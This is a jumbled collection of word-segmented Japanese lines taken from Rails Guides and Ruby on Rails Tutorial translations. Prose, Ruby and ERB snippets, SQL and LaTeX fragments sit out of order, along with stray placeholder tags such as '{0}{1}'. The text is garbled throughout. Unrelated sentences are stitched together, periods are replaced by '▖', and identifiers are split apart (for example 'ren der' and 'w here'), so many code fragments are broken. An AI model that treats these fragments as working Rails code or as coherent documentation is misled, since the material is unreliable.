=> " The string   is   nonempty "
=>  " Newlines  (\\n )   and  tabs (\\t )   both  use  the  backslash  character  \\▖ "
記憶 トークン を 参照 し て い る の で 問題 あ り ま せ ん ▟ メソッド の 引数 と 同じ 名前 を 使用 する こと は よく あ り ま す 。
Rack に 関 する 解説 は この ガイド の 範疇 を 超え て しま い ま す 。
{ 0 } { 1 } 第 2 章 { / 1 } { / 0 } で は 、 Rails アプリケーション の 基本 的 な 仕組み を 体験 する ため に 、 別 の プロジェクト を 作成 し ま す 。
パスワード 再 設定 の \ kode {update } アクション
バリデーション に 失敗 し た 場合 に は モデル に エラー メッセージ を 追加 し 、 バリデーション が 無効 に な る よう に し て くださ い 。
無効 な ユーザー 登録 に 対 する テスト   GREEN { 2 } { 3 } { / 3 } { 3 } { 4 } { / 4 } { / 3 } { 3 } { / 3}{ / 2 }
フォロー し て い る ユーザー と フォロワー を 実装 する 前 に 、 User と Relationship の 関連 付け を 行 い ま す 。
この 状況 を 切り抜け る ため に 、 テスト 用 の フィクスチャ ユーザー で は 全員 同じ パスワード 「 \ kode { password } 」 を 使用 する こと に し ま す ▟ これ は フィクスチャ で よく 使 わ れ る 手法 で す 。
###  バック エンド
  <%=  f▖ text _field  : author_ name  %>
        User Mailer ▖welcome_email ( @user ) ▖ deliver_ later
{ nil  => nil ,   1   = >   1 ,   " a "  => " a " }▖symbolize_keys
この エラー は 、 コメント の 表示 に 必要 な パーシャル が 見つか ら な い ため で す 。
\ kode {help } アクション に 対応 する ビュー も 、 上 の コード と 似 て い ま す   ( { 1 } { 2 } リスト 3 ▖ 8 { / 2 } { / 1 } ) 。
確認 バリデーション が 失敗 し た とき に 、 ` attribute ` で は な く `:#{attribute}_confirmation ` に アタッチ さ れ る よう に な り ま し た 。
問題 を うま く 再現 でき た ら 、 その こと を issue の コメント に 追加 し ま しょ う 。
*   himself また は herself  ->  themselves に 置き換え る
`@ article ` オブジェクト は インスタンス 変数 な の で 、 ビュー で 出力 さ れ る どの パーシャル から も アクセス でき ま す 。
現在 は 以下 の よう に 簡潔 に 書 く こと が でき ま す 。
|` logger ` | 可能 で あ れ ば メール 送受信 に 関 する 情報 を 生成 し ま す 。
ルート 作成 時 に コロン を 付け な かっ た 部分 は 、 静的 な セグメント と し て 固定 文字 列 が 指定 さ れ ま す 。
今度 は テンプレート が な い よう で す ▟ Rails で は テンプレート と い え ば すなわち 「 ビュー 」 の こと で す 。
email = foo % 40 example ▖ com
この アクション が パブリック な API で 使用 さ れ て お ら ず 、 HTTP メソッド を 自由 に 変更 でき る の で あ れ ば 、 ルーティング を 更新 し て ` patch ` を `put ` の 代り に 使用 でき ま す 。
def  set_conditional _cache_control !
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/object/blank▖ rb ` で す 。
これ だけ で は 飾り気 が なさ すぎ る 感じ も し ま す が 、 今 は これ で よし と し ま す 。
インストール や 設定 など に 関 する 多く の わずらわし い 問題 を 回避 する ため 、 クラウド 開発 を 標準 で 採用 し ま し た   ( \ ref{ sec : up_and _running } ) 。
比較 の 結果 が 一致 すれ ば 、 送信 さ れ た パスワード は 正し い と 認識 さ れ 、 その ユーザー は 認証 さ れ ま す 。
`: through ` オプション は 、 クエリ 実行 時 に 経由 する 結合 ( join ) モデル を 指定 し ま す 。
ふたたび ` Articles Controller ` に 戻 り ま しょ う ▟ 先ほど 作成 し た ` Article ` モデル を 使用 し て 、 ` create ` アクション を 変更 し な けれ ば な り ま せ ん 。
たとえば 、 ` Action Mailer : : Base ` に 以下 の 定義 が あ る と し ま す 。
" p " ,  " q " ,   " r " ,   " s " ,  " t " ,   " u " ,  " v " ,   " w " ,   " x " ,  " y " ,   " z " ]
* * N  +   1 クエリ 問題 * *
アプリケーション の 簡単 な 説明   ( 訳注 :   近年 は   ▖ rdoc より も   ▖ md   ファイル の 方 が よく 使 わ れ て い る よう で す )
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ module/aliasing ▖ rb ` で す 。
*   FROM   " articles "
   def  name_with _ initial
clients ▖each   do  | client |
{ 0 } 図 2 ▖ 9 { / 0 }   { 1 } 2人 目 の ユーザー が 追加 さ れ た 一覧 ページ   ( \ href { http://0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users }{/ users }) { / 1 }
% w ( 1   2   3   4   5   6   7 ) ▖ in_groups ( 3 )
エンジン の クラス を オープン クラス 化   ( open   classing )   する こと で 、 メイン の アプリケーション で 使用 でき る よう に 再 定義 さ れ ま す 。
特定 の ユーザー を 表示 する ページ
|   DELETE     | /photos/:id       | images# destroy    |  photo _ path(:id )       |
  $  heroku run  console
-----------------------------------
( \ ref{ sec :a_hashed_ password } の パスワード ダイジェスト の とき の マイ グレーション と 比較 し て み ま しょ う ) 。
umerate}╼╼    %  subsection   creating _microposts   ( end ) ╼╼    \ subsection { フィード の 原型 }  %  ( fold) ╼    \ label{ sec :a_proto _feed}╼╼
#   SELECT  *  FROM   clients  ORDER   BY  orders_count   ASC ,   created_at   DESC
      encoding :  'SpecialEncoding ' ,
Bitbucket アカウント が な い 場合 は \ href {https://bitbucket▖org/account/ signup/}{ アカウント を 作成 し ま す } 。
\ kode {save } メソッド は 、 成功 すれ ば \ kode {true } を 、 失敗 すれ ば \ kode {false } を 返 し ま す
` invalid ? ` は 単なる ` valid ? ` の 逆 の 動作 で す 。
# =>  { 1 = > 1 ,  nil = > nil ,  : a= > " a " }
レイアウト に あ る すべて の リンク に 対 し て 統合 テスト を 書 い て み ま しょ う ▟ ログ イン 済み ユーザー と そう で な い ユーザー の それぞれ に 対 し て 、 正し い 振る舞い を 考え て くださ い 。
( この 間違 っ た 用語 に つ い て 指摘 し て くれ た Andy   Philips に 感謝 し ま す ▟ )
   before_ save   : before_ save_ callback   #  良 い
Twitter の よう な 「 フォロワー   ( following ) 機能 」 や 「 フォロー 中   ( followed ) 機能 」 が な い
` root ` で 始ま っ て い る 行 を 見つけ 、 コメント 記号 を 外 し て くださ い 。
ここ で 静的 な ページ を 作 る ため に 採用 し た 方法 は 、 おそらく 最も シンプル な 方法 で す ▟ ただし 他 に も 方法 は あ り ま す 。
### `: allow_ nil `
   server ▖ start
</span>
これ で 静的 ページ へ の ルート が すべて 動作 し 、 テスト も すべて パス する はず で す 。
それぞれ の メリット と デメリット は 以下 の とおり で す 。
失敗 する テスト を 確認 する ため に 検証 を コメント アウト する 。
{ 0 } 図 7 ▖ 13 { / 0 }   { 1 } \ kode { text } フィールド と \ kode { password } フィールド に 文字 を 入力 し た 状態 { / 1 }
この メソッド は 内部 で ` content_tag _ for ` を 呼び出 し て ` : div ` を タグ 名 に し て くれ る 、 便利 な メソッド で す 。
#   Build  JSON   APIs  with  ease ▖
Action   View に つ い て
###  Action   Controller を 設定 する
$  rails server
"table " ▖ pluralize     # => "tables "
</ h 1 >
`find ` メソッド で マッチ する レコード が 見つか ら な い 場合 、 ` ActiveRecord : : Record NotFound ` 例外 が 発生 し ま す 。
# =>  ( 123 )   55 5 - 123 4
これ を 行な う に は 、 従来 の 相対 パス に 代え て CD N を アセット の ホスト サーバー と する よう Rails を 設定 し ま す 。
変更 の 結果 を リスト \ ref{ code : create_js_erb } に 示 し ま す 。
これ に よ り 、 任意 の ユーザー が 自分 自身 に アプリケーション の 管理 者 権限 を 与え る こと を 防止 でき ま す 。
推奨 環境 で あ る クラウド IDE   ( \ ref{ sec : development_environment} )   に は デフォルト で Git が 導入 さ れ て い ま す の で 、 追加 で 導入 する 必要 は あ り ま せ ん 。
データベース 上 に データ を 追加 する の は 遅 く な り がち で 、 システム に よ っ て は 数 分 かか る こと も あ り 得 ま す 。
第 \ ref { cha :a_toy_ app } 章 で は 、 Rails アプリケーション の 基本 的 な 仕組み を 体験 する ため に 、 別 の プロジェクト を 作成 し ま す 。
ユーザー 自体 が 破棄 さ れ た とき に 、 その ユーザー に 依存 する マイクロ ポスト   ( つまり 特定 の ユーザー の もの )   も 破棄 さ れ る こと を 指定 し て い ま す 。
*   `update_ column `
    respond_to  do  | format |
#   メッセージ の 連鎖
*   アプリケーション の アセット を 正し く 編成 する 方法
Asset   Pipeline の 最大 の メリット の 1 つ は 、 本番 の アプリケーション で 効率 的 に な る よう に 最適 化 さ れ た アセット も 自動 的 に 生成 さ れ る こと で す 。
エンジン を 使 う うち に 、 その 中 で イニ シャライザ や 国際 化 など の 機能 オプション を 使用 し た く な る こと で しょ う 。
` File ` の 拡張
\emph { 期待 どおり } の 条件 と な り ま す ▟ そして 条件 が 満た さ れ る と リスト \ ref{ code :user_ model_ password _ reset_expired } の \ kode { password\_ reset\_expired ? } メソッド が 実行 さ れ ま す
###  バイト
この メソッド に は 、 キャッシュ し た い コンテンツ を 1 つ の ブロック に 含め て 引数 と し て 渡 し ま す 。
利用 可能 な 数 より も 多く の 接続 を 使用 し よう と する と 、 Active   Record は 接続 を ブロック し 、 プール から の 接続 を 待 ち ま す 。
ビュー は 、 ( Apache や Nginx など の Web サーバー を 経由 し て は い る が )   ブラウザ に HTML を 直接 返 す と 説明 し て い る 文献 も あ り ま す 。
person ▖errors [ : name ]  # => [ ]
フォーム を 送信 する と 、 フォーム に 含 ま れ る フィールド は   _ パラメータ _   と し て Rails に 送信 さ れ ま す 。
     Admin ?   : <%=   permis sion_fields ▖ check _ box  : admin  %>
コマンド
この ミドルウェア は 、 ` config▖ cache_classes ` が `false ` に 設定 さ れ て い る 場合 のみ 有効 に な り ま す 。
リダイレクト で は \ kode {user_url } を 省略 し 、 単に \ kode {redirect_to @user } と 書 け ば ユーザー 表示 ページ に 移動 し ま す 。
Active   Support に は 配列 の API が 多数 追加 さ れ て お り 、 配列 に 容易 に アクセス でき る よう に な っ て い ま す 。
ファイル の 中身 を すべて 削除 し 、 以下 の 1 行 に 置き換え て くださ い 。
以下 の よう な Rails の デフォルト 情報 ページ が 表示 さ れ ま す 。
ログ インフォーム
<% = stylesheet_link_tag  " blorgh/style ▖css "  %>
` author ` オブジェクト と ` User ` クラス の 関連 付け を 示 す こと に よ り 、 エンジン と アプリケーション の 間 に リンク が 確立 さ れ ま す 。
次 に データベース を リセット し 、 サンプル データ を 再度 生成 し ま す 。
<% =  ren der   " shared/ad_banner "  %>
上 の コード に よ っ て 以下 が 生成 さ れ ま す 。
    has_many  : subordinates ,  class_ name :  " Employee " ,
last ` メソッド は 、 モデル に レコード が 1 つ も な い 場合 に ` nil ` を 返 し ま す ▟ この とき 例外 は 発生 し ま せ ん 。
     def  before_ save_ callback
( { 0 } { 1 } 第 8 章 { / 1 } { / 0 } で 本格 的 に 実装 し ま す ) 。
その 背後 で は 、 その オブジェクト から 主 キー を 取り出 し 、 関連 付け る オブジェクト の 外部 キー の 値 を その 主 キー と 同じ 値 に し ま す 。
*   Rails で 皆 が 使用 し て い る 慣例 や ヘルパー メソッド を 使用 する こと 。
この ヘルパー は 、 1 つ の ブロック に 対 し て 属性 を 検証 し ま す 。
*   [ Rack   API   ドキュメンテーション ] ( http://rack ▖ github▖io/ )
得 られ た 文字 列 に 対 し て ` constantize`   ( 後述 )   を 実行 する こと で 本当 の クラス オブジェクト を 得 られ ま す 。
以下 の スタイル で 書 く こと 。
これ は 、 \ kode { a } と \ kode { b } が 同じ 配列 を 指 し て い る ため で す
     def find_ by _ order _ prefix (order _number )
記事 に コメント が 追加 さ れ た ところ ] ( images/getting _ started/article _with _ comments▖ png )
一部 の 設定 に つ い て は 、 Rails の 外部 から 環境 変数 を 与え る こと で 行な う こと も でき ま す 。
` collection▖build ` メソッド は 、 関連 付け が 行 わ れ た オブジェクト を 1 つ 返 し ま す 。
これ に 代え て 、 以下 の よう に \ kode {sequence } メソッド を 使用 し て 一連 の 名前 と メール アドレス を 列挙 し ま す 。
      errors▖ add(:expiration_date ,  " :   過去 の 日付 は 使用 でき ま せ ん " )
    layout   : products_layout
       create      app/assets/javascripts/microposts▖js▖ coffee
これ は リスト \ ref{ code :utility _ method_tests } で 使用 さ れ て い ま し た 。
|                     |   202                | : accepted                        |
####  JSON を 出力 する
Ruby   on   Rails   3 ▖ 2   チュートリアル
WARNING:  `: prefix ` オプション が ` true ` の 場合 、 一般 性 が 低下 し ま す   ( 後述 ) 。
この ヘルパー は 、 属性 に 数値 のみ が 使用 さ れ て い る こと を 検証 し ま す 。
( 現状 で は 、 保存 は すべて 成功 する はず で す ▟ 失敗 する 場合 に つ い て は \ ref{ sec :user_ validations } で 説明 し ま す ) 。
` order ` メソッド は 、 関連 付け られ た オブジェクト に 与え られ る 順序 を 指定 し ま す ▟ 内部 的 に は SQL の ` ORDER   BY ` 句 が 使用 さ れ ま す 。
#   永続 的 セッション を 破棄 する
「 地球 滅亡 クラス 」 の 重大 な 問題 で も な い 限り 、 レポート し て もら っ た issue は 他 の issue と 同様 に 、 解決 に 向け て 共同 作業 が 行 わ れ る よう に な り ま す 。
{ 0 } 図 10 ▖ 2 { / 0 } { 1 } micropost   と  user { / 1 } 間 の \ kode {belongs_to } リレーションシップ
これ は リスト \ ref{ code :correct_ signin_failure_test } で 使用 さ れ て い ま し た 。
既存 の コミット その もの を 修正 する こと を 求め られ る こと も あ り ま す 。
コントローラ の 場合 と 同様 、 メイラー の メソッド 内 で 定義 さ れ た すべて の インスタンス 変数 は その まま ビュー で 使用 でき ま す 。
* ` lib/assets` は 、 1 つ の アプリケーション の 範疇 に 収ま ら な い ライブラリ の コード や 、 複数 の アプリケーション で 共有 さ れ る ライブラリ の コード を 置 く 場所 で す 。
上 の 操作 で デプロイ と マイグレーション を 行 う と 、 その 間 に 標準 の エラー ページ が 出力 さ れ ま す
image_url( " edit▖ png " )  # => http://www ▖example ▖ com/assets/edit▖ png
記憶 ブランチ を テスト する
####  JRuby プラットフォーム で Postgre SQL データベース を 使用 する
これ は 、 ` Model ▖find ` 呼び出し で ` includes ` を 指定 する こと で 実現 でき ま す 。
*   FROM   " users "   WHERE   " users " ▖ " state "   =  'active'   AND   " users " ▖ " state "   =  'inactive'
array      # =>  [ ' foo' ]
    has _one   : account ,   class_ name :  " Billing " ,   dependent : :nullify
` Article#time_ since_ created ` を * * 追加 する * * 場合 :
( 今 は この うち の 1 つ しか 使 い ま せ ん が 、 あと で 他 の マイクロ ポスト も 利用 し て い き ま す ▟ )
   mail ( to :  email_ with _ name ,   subject :  'Welcome to  My   Awesome  Site ')
signup ページ へ の テスト は 演習 に 回 す こと に し ま す   ( \ ref{ sec : exercises_rails_ routes} ) 。
<%=  user_url( @user ,   host :  'example ▖ com')  %>
冗長 性 の 原因 は 他 に も あ り ま す 。
    To   get  help  on this   sample  app ,  see   the
もちろん 、 この オブジェクト は 何 ら か の 形 で 参照 可能 な 識別 子   ( id )   を 持 つ 必要 が あ り ま す 。
    @users   =  User ▖ all
生成 さ れ た テスト を 見 て み ま しょ う   ( リスト \ ref{ code : default_controller_test } ) 。
ren der template :  " books/edit "
*   FROM   ` users `   WHERE   ` users `▖` id `  =   1
( パス し た とき に も 色 を 表示 でき る よう に する に は 、 \ ref{ sec : minitest _ reporters } の minitest レポーター を オプション で 追加 する 必要 が あ り ま す ) 。
この 機能 を 実現 する に は 、 Rails と Ruby の 高度 な 機能 の 他 に 、 SQL プログラミング の 技術 も 必要 で す 。
    redirect_to(@book )
` extending ` メソッド は 、 関連 付け プロキシ を 拡張 する 名前 付き モジュール を 指定 し ま す 。
*  `config▖ action _mailer▖ interceptors ` は 、 メール を 送信 する 前 に 呼び出 す インター セプタ を 登録 し ま す 。
2   rows in set   ( 0 ▖ 0 0   sec )
もし XSS で 汚染 さ れ た 文字 列 が 戻 り 値 に 含 ま れ て い る と 、 ブラウザ で 表示 さ れ た とき に 悪意 の あ る コード が 実行 さ れ て しま い ま す 。
        <b > Zone   name </ b ><br>
\ kode {header } タグ は 、 ページ の トップ に 来る べ き 要素 を 表 し ま す 。
皆 さん の ご 推察 どおり 、 実 は \ kode {nil } か どう か を 調べ る メソッド も あ り ま す 。
たとえば 、 以下 の よう な ビュー が あ る と し ま す 。
\ kode {flash▖now } メソッド を 使用 する と 、 レンダリング 済み の ページ に も フラッシュ メッセージ を 表示 でき ま す 。
*  `config▖ action_controller▖ default _ charset ` は 、 すべて の 画面 出力 で 使用 さ れ る デフォルト の 文字 セット を 指定 し ま す 。
ユーザー が パスワード の 再 設定 を リクエスト する と 、 ユーザー が 送信 し た メール アドレス を キー に し て データベース から ユーザー を 見つけ る 。
s ▖ add_dependency   " moo "
    adapter :  jdbcpostgresql
" bar "  : " baz "
a 2   =   A ▖ new
#  : uglifier  config ▖ assets▖css_ compressor   = :yui
実 は 、 \ kode {assigns } と い う 特殊 な テスト メソッド を 使用 する と アクセス でき る よう に な り ま す 。
  <%=  comment▖ commenter   %>
     def  #{severity ▖ downcase } ?                                        
####  Java Script/ Coffee Script と ERB
無名 モジュール ( anonymous   module ) を 使用 し て これ ら の オブジェクト を 拡張 ( 検索 、 作成 など の メソッド を 追加 ) する こと が でき ま す 。
NOTE :   通常 の フォーム で は その ため の 隠し フィールド が 生成 さ れ る の で 、 これ ら の タグ は 使用 さ れ ま せ ん 。
< a   href = " # "   onclick = " paintIt( this ,  '# 0000 9 9 ' ,  '# FFFFFF ' ) " > Paint  it  blue </a>
その 際 に は なるべく ` config/ environments ` に あ る 既存 の ファイル を 流用 し 、 必要 な 部分 のみ を 変更 する よう に し て くださ い 。
Age :   885 8 1 4
Web ブラウザ は 実際 に は \ texttt { DELETE } リクエスト を 発行 でき な い の で 、 Rails で は Java Script を 使用 し て この リクエスト を 「 偽造 」 し ま す 。
\ kode {authenticated ? } を 追加 する
Rails   4 ▖ 1 で は 、 各 フィクスチャ の ERB は 独立 し た コンテキスト で 評価 さ れ ま す ▟ この ため 、 ある フィクスチャ で 定義 さ れ た ヘルパー メソッド は 他 の フィクスチャ で は 利用 でき ま せ ん 。
  @ article   =   Article▖ new( article _params )
    has _one   : guest
置き換え の 終わ っ た 正し い アプリケーション コード を リスト \ ref{ code :correct_ signin_failure } に 示 し ま す 。
`:type ` オプション で : builder を 指定 する と 、 ERB に 代え て Builder が 使用 さ れ ま す 。
= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =
以上 の 準備 が 終わ れ ば 、 以下 の コマンド で \ kode { guard } を 起動 でき ま す 。
\ kode { from _users _ followed_by } の 最終 的 な 実装 。
` form _ for ` メソッド を 呼び出 す とき に は 、 この フォーム を 識別 する ため の オブジェクト を 渡 し て くださ い 。
その ため に は 、 ` app/controllers/articles_controller▖ rb ` の ` new ` アクション ` と ` create ` アクション を 以下 の よう に 変更 し て くださ い 。
User ▖ w here ( weekly_ subscriber:  true ) ▖ find _each   do  |user |
さらに 、 上 の よう に \ kode { params } ハッシュ を まる ごと 渡 す と エラー が 発生 する の で 、 Rails は デフォルト で マス アサインメント の 脆弱 性 から 守 ら れ る よう に な り ま し た 。
{ nil  => nil ,   1   = >   1 ,  " nested "  => { " a "  = >   3 ,   5   = >   5 } } ▖ deep_symbolize_keys
The  \ kode { current_user ? }  
` ActiveRecord : : Base# to_ param ` は モデル の ` id ` を 返 し ま す が 、 この メソッド を モデル 内 で 再 定義 する こと も でき ま す 。
% w ( a b  c  d ) ▖ third  # => c
以下 の 例 は ` ActionDispatch : :Http: : Cache: : Response ` から 引用 し ま し た 。
上 の コマンド で は 、 指定 し た テスト ファイル 内 に あ る 特定 の テスト だけ を 実行 する ため に 、 以下 の オプション を 追加 し て あ り ま す 。
WARNING :   上 の 正規 表現 で は 末尾 に 改行 記号 が あ っ て も マッチ し ま す 。
### `atomic _write `
  group ( " date ( created_at ) " ) ▖ having ( " sum ( price )  > ? " ,   10 0 )
docrails は 、 コーディング から 独立 し た ドキュメンテーション のみ を 目的 と し て い ま す 。
( \ kode {eq } は 同値 性 を テスト する RSpec の メソッド で す ) 。
    if  options [ :fields ] ▖any ? {
これ で find の 場合 の テスト を 実施 でき ま す ▟ )
    has_many  : ads
*  `autobuffer:  true ` は 、 ページ 読み込 み 時 に すぐ 再生 でき る よう に ビデオ を 事前 に 読み込 ん で お き ま す 。
|   GET        | /sekret/ comments/: id ( ▖: format )          |  comments # show      |  comment_ path          |
与え られ た 文字 列 を ` constantize ` メソッド で 評価 し て も 既知 の 定数 と マッチ し な い 、 また は 指定 さ れ た 定数 名 が 正し く な い 場合 は ` NameError ` が 発生 し ま す 。
そして 、 edit ページ を 表示 し て も \ kode {edit } アクション の 認可 テスト は でき ま す が 、 \ kode {update } アクション の 認可 テスト は でき ま せ ん 。
関連 付け られ た ユーザー を 通 し て マイクロ ポスト に アクセス する の で 、 \ kode { create } アクション や \ kode { destroy } アクション を 利用 する ユーザー は 、 ログ イン 済み で な けれ ば な り ま せ ん 。
そんな とき に は デフォルト の 命名 ルール を 簡単 に オーバーライド でき ま す 。
strip_tags( "<b > Bold</b> no  more !   
       create   app/controllers/users_controller▖ rb
####  CD N で 静的 な アセット を 提供 する
体制 が 整 っ た の で 、 早速 コード を 追加 ・ 編集 し ま しょ う 。
リソース ベース の ルーティング :   Rails の デフォルト
Ruby の 文字 列 は 、 以下 の よう に \ kode {empty ? } メソッド に も 応答 する こと が でき ま す 。
リスト \ ref{ code :bootstrap_css } の 2 行 で は 、 Bootstrap   CSS の フレームワーク を 導入 し て い ま す 。
組み込 み ヘルパー
\ kode{gravatar \_ for } ヘルパー メソッド を 定義 する
{ 0 } 図 11 ▖ 2 { / 0 } { 1 } フォロー する 相手 を 見つけ る ▟ \ href { http://railstutorial ▖org / images/figures/page _ flow _user_ index_ mockup_bootstrap - full ▖ png } { ( 拡大 ) } { / 1 }
リスト \ ref{ code : users _migration } の マイ グレーテョン に よ っ て 作成 さ れ た 完全 な データ モデル を 図 \ ref { fig :user_ model_ initial } に 示 し ま す
マイクロ ポスト 投稿 フォーム に 画像 アップ ローダー を 追加 する
読 む に 値 する Rails 関連 の 書籍 や ドキュメント は 書店 や Web で いくら で も 見つけ られ ま す ▟ 正直 、 あまり の 多 さ に 閉口 する ほど で す 。
デフォルト で は 、 Sprockets が 使用 する パブリック な パス は `/assets ` に な り ま す 。
また 、 \ kode { has_ secure_ password } を 使 っ て パスワード を ハッシュ 化 する ため に は 、 最 先端 の ハッシュ 関数 で あ る \ href { http://en ▖wikipedia ▖org/wiki/ Bcrypt}{bcrypt } が 必要 に な り ま す 。
Sign   in
新し い データ モデル で データベース を 更新 する に は 、 \ ref{ sec : demo_ users _ resource } の とき と 同様 に マイグレーション を 実行 し ま す 。
now ▖all _week
これ を 行 わ な い と 、 「 なぜ か テスト が とお ら な い ▖ ▖▖orz 」 と い う こと に な り かね ま せ ん 。
次 に 、 対応 する パーシャル を リスト \ ref{ code :micropost _ partial } に 示 し ま す 。
以下 の よう に 、 数値 の 桁 区切り を 追加 し て 文字 列 形式 に でき ま す 。
      invoke     jbuilder
データ が アプリケーション の 他 の 部分 に よ っ て 更新 さ れ て い る 可能 性 に 対応 する ため に 、 キャッシュ を 再 読み込 み する に は どう し た ら よ い で しょ う か 。
private
ここ で は デフォルト の ページ を 差し替え た い の で 、 \emph { ルート の ルーティング }   ( \emph { ルート   URL } に アクセス し た 場合 の ルーティング )   を 変更 する こと に し ま す 。
リポジトリ を 作成 し た ら 、 以下 を 実行 し て アプリケーション を プッシュ し ま す 。
assemblies▖ create ! ( attributes = {}) `
use   Rack : : Head
` belongs_to ` 関連 付け を 宣言 し た クラス で は 、 以下 の 5 つ の メソッド を 自動 的 に 利用 でき る よう に な り ま す 。
    ( Not   Yet  Implemented )
ただし 、 1 つ 重要 な 違い が あ り ま す ▟ Ruby は シングル クォート 文字 列 の 中 で は 式 展開 を 行 い ま せ ん 。
        <%=  f▖ text _field  : name  %>
atom_feed   do   | feed |
テスト 環境 で \ kode { full_title } ヘルパー を 使 う   ( { 3 } { 4 } { / 4 } { 4 } { 5 } green { / 5 } { / 4 } { 4 } { / 4 } { / 3 }
返 さ れ る 値 は 、 その フィールド の 平均 値 で す ▟ 通常 3 ▖ 14159265 の よう な 浮動 小数 点 に な り ま す 。
#     < authored -timestamp type =" datetime" > 2009 - 0 9 - 0 2 T 16 : 44 : 36 Z </authored -timestamp>
著者 の システム 上 で は 、 以下 の URL を ブラウザ で 開 く と 、
これ に よ り 、 ルーティング で 以下 の よう な パス が 認識 でき る よう に な り ま す 。
NOTE :   上 の 例 で は " staging " と い う カスタマイズ し た 環境 を 使用 し て い ま す ▟ これ は 本番   ( production 環境 )   に 準 じ た 状態 で テスト を 行 う ため の 環境 で す 。
*   ビュー の 出力 に は 基本 的 に `main ` レイアウト が 使用 さ れ ま す 。
|   POST       | /photos          | images# create     |  photos_ path          |
{ 0 } リスト 2 ▖ 7 { / 0 } ╼╼ { 1 } index アクション に 対応 し て い る ビュー { 2 } { / 2 }   { 3 } app/views/users/index▖html ▖erb { / 3} { / 1 }
( \ kode { curl} コマンド の 詳細 に つ い て は 、 \ href { http://conqueringthecommandline ▖ com/book / curl} {\emph { Conquering   the   Command   Line } と い う 本 の 第 3 章 }   ( 英語 )   を 参照 し て くださ い )   。
*  ` after_remove `
#### ` deep _merge ` と ` deep _merge !
   validates : bio ,  length : {  maximum :   500   }
###   複製
    gem ' therubyracer '
これ は リスト \ ref{ code :initial_create_session } で 使用 さ れ て い ま し た 。
     do _stuff
コンソール に 戻 っ て \ kode { password_digest } 属性 を 参照 し て み る と 、 リスト \ ref{ code : password _implementation } の \ kode { has_ secure_ password } の 効果 を 確認 でき ま す 。
*  irc▖ freenode ▖ net 上 の [ # rubyonrails ] ( irc://irc▖ freenode ▖ net/#rubyonrails ) チャンネル
上 に 示 し た よう に 、 \ kode { map } メソッド は 、 与え られ た ブロック を 配列 や 範囲 オブジェクト の 各 要素 に 対 し て 適用 し 、 その 結果 を 返 し ま す 。
class   Picture  <  ActiveRecord : : Base
invoke    test _unit
ここ で 渡 す ブロック は rake タスク と し て _ 実行 さ れ る _   こと に ご 注意 くださ い 。
##### `: through `
まず は 存在 する ユーザー から 探 し て み ま しょ う 。
#   指定 さ れ た 数値 を デフォルト の 日付 と し て 持 つ セレクト ボックス を 生成 する
テーブル に 含 ま れ る フィールド の すべて の レコード に おけ る 合計 を 得 る に は 、 その テーブル を 持 つ クラス に 対 し て ` sum ` メソッド を 呼び出 し ま す 。
  <%=   submit_tag  ' Create' %>
       create      app/views/microposts/index▖ json▖jbuilder
`welcome_email ` と い う 名前 の メソッド を 追加 し 、 ユーザー が 登録 し た メール アドレス に メール を 送信 でき る よう に し て み ま しょ う 。
これ は リスト \ ref{ code : general_authenticated_p } で 使用 さ れ て い ま し た 。
今回 の 場合 、   About ページ を 使用 でき る よう に する に は 、 \ kode {about } アクション を StaticPages コントローラ の 中 に 追加 する 必要 が あ り ま す 。
### Ajax インジェクション
それ に は まず 、 ドル 記号   ( $)   を 使用 し て DOM 要素 に 一意 の CSS   id で アクセス する 文法 に つ い て 知 る 必要 が あ り ま す 。
Rails アプリケーション で リソース の ルーティング に "/assets " ルート を 使用 し て い る 場合 、 コンフリクト を 避け る ため に 以下 の 変更 を 加え ま す 。
初めて の リポジトリ セット アップ
###  メソッド 委譲
` w here ` 句 と 同様 、 ` AND ` 条件 を 使用 し て スコープ を マージ でき ま す 。
####  collection_check _ boxes
バージョン 番号 の 異な る gem 同士 が コンフリクト する こと が あ る ため 、 一連 の gem を 自己 完結 的 に まとめ た \emph {gemset } と い う もの を 作成 し て バージョン を 使い分け る の が 便利 で す 。
クラス に つ い て 学 ぶ とき 、 \emph { superclass } メソッド を 使 っ て \ kode { クラス 階層 } を 調べ て み る と よく わか り ま す 。
空 文字 へ の リンク も 同様 に 例外 が 発生 し ま す 。
/microposts/1
ユーザー 表示 ビュー が 正常 に 動作 する ため に は 、 Users コントローラ 内 の \ kode { show } アクション に 対応 する \ kode {@user } 変数 を 定義 する 必要 が あ り ま す 。
誤 っ た パスワード
これ は リスト \ ref{ code : full_title_helper_tests } で 使用 さ れ て い ま し た 。
Prepared   Statements の 使用 量 の 増大 は 、 その まま データベース で 必要 な メモリー 量 の 増大 に つなが り ま す 。
今度 は すべて の ユーザー を 表示 する ため に 、 全 ユーザー が 格納 さ れ た 変数 を 作成 し 、 順々 に 表示 する index ビュー を 実装 し ま す 。
  About ページ の テスト を 追加 する 。
** ` ActionDispatch : : ParamsParser` * *
たとえば 、 `type ` と い う 語 は テーブル で Single   Table   Inheritance   ( STI ) を 指定 する ため に 予約 さ れ て い ま す 。
どの くらい 細か く テスト する か は お 任せ し ま す ▟ リスト \ ref{ code :flash_test } に テンプレート を 用意 し て お い た の で 、 参考 に し て くださ い 。
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/enumerable▖ rb ` で す 。
create_customer !
あるいは 、 多く の ページ で 使用 する 共通 の ヘッダー が あ り 、 この ヘッダー に 特定 の ページ で のみ Java Script や CSS ファイル を 挿入 し た い 場合 に も 便利 で す 。
エンジン と アプリケーション は 、 同じ 構造 を 共有 し て い ま す 。
他 の 環境 で 実行 し た い 場合 は
#   定数 M は 既に 存在 し て な い の で 、 定数 M を 経由 し て 到達 でき な い
テスト を パス さ せ る ため に 、 リスト \ ref{ code : test _with _ password_confirmation } の よう に パスワード と パスワード 確認 の 値 を 追加 し ま す 。
この 例 で は Ruby   1 ▖ 9 ▖ 3 を 前提 と し て い ま す 。
この テスト で は \ kode { have _title } メソッド を 使 っ て い ま す ▟ これ は 与え られ た コンテンツ に HTML 要素   ( タイトル )   が あ る か どう か を チェック し ま す 。
マイクロ ポスト を 作成 する   ( \kode {user_ id   =  user ▖ id } ) 。
  else
id = \ kode { 1 } の マイクロ ポスト を 編集 する ページ
       create      app/views/microposts/index▖html ▖erb
email = michael % 40 michaelhartl▖ com " > Activate</a>╼----==_mimepart _540 77 0 4656 b 50_ 61 d 3 fd 1914 f 4 cd 02996 a - -
